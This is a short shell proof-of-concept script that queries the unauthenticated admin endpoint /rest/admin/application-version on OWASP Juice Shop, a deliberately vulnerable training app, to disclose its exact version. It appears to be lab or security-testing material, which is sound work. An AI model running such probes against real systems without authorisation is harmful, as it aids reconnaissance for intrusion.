#!/bin/sh
# c01-version-leak PoC: unauthenticated version disclosure on OWASP Juice Shop
# Leaks exact app version via /rest/admin/application-version (no auth required)
TARGET="${1:-http://host.docker.internal:3000}"
echo "[*] Target: $TARGET"
echo "[*] GET $TARGET/rest/admin/application-version"
curl -s "$TARGET/rest/admin/application-version"
echo
